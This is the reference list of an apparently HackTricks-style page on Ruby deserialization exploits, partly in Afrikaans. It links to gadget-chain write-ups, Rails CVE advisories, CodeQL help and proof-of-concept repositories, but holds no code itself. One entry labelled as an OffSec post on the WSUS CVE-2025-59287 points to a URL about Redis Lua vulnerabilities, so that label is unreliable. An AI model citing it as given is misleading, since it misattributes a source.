- Trail of Bits – Marshal madness: 'n beknopte geskiedenis van Ruby deserialisasie-uitbuitings: https://blog.trailofbits.com/2025/08/20/marshal-madness-a-brief-history-of-ruby-deserialization-exploits/
- elttam – Ruby 2.x Universal RCE Deserialization Gadget Chain: https://www.elttam.com/blog/ruby-deserialization/
- Phrack #69 – Rails 3/4 Marshal chain: https://phrack.org/issues/69/12.html
- CVE-2019-5420 (Rails 5.2 insecure deserialization): https://nvd.nist.gov/vuln/detail/CVE-2019-5420
- ZDI – RCE via Ruby on Rails Active Storage insecure deserialization: https://www.zerodayinitiative.com/blog/2019/6/20/remote-code-execution-via-ruby-on-rails-active-storage-insecure-deserialization
- Include Security – Ontdekking van gadget-kettings in Rubyland: https://blog.includesecurity.com/2024/03/discovering-deserialization-gadget-chains-in-rubyland/
- GitHub Security Lab – Ruby onveilige deserialisasie (query-hulp): https://codeql.github.com/codeql-query-help/ruby/rb-unsafe-deserialization/
- GitHub Security Lab – PoCs repo: https://github.com/GitHubSecurityLab/ruby-unsafe-deserialization
- Doyensec PR – Ruby 3.4 gadget: https://github.com/GitHubSecurityLab/ruby-unsafe-deserialization/pull/1
- Luke Jahnke – Ruby 3.4 universele ketting: https://nastystereo.com/security/ruby-3.4-deserialization.html
- Luke Jahnke – Gem::SafeMarshal escape: https://nastystereo.com/security/ruby-safe-marshal-escape.html
- Ruby 3.4.0-rc1 release: https://github.com/ruby/ruby/releases/tag/v3_4_0_rc1
- Ruby fix PR #12444: https://github.com/ruby/ruby/pull/12444
- Trail of Bits – Ouditering van RubyGems.org (Marshal-bevindinge): https://blog.trailofbits.com/2024/12/11/auditing-the-ruby-ecosystems-central-package-repository/
- watchTowr Labs – Is This Bad? This Feels Bad — GoAnywhere CVE-2025-10035: https://labs.watchtowr.com/is-this-bad-this-feels-bad-goanywhere-cve-2025-10035/
- [OffSec – CVE-2025-59287 WSUS unsafe deserialization (blog)](https://www.offsec.com/blog/recent-vulnerabilities-in-redis-servers-lua-scripting-engine-2/)
- [PoC – tecxx/CVE-2025-59287-WSUS](https://github.com/tecxx/CVE-2025-59287-WSUS)

{{#include ../../banners/hacktricks-training.md}}
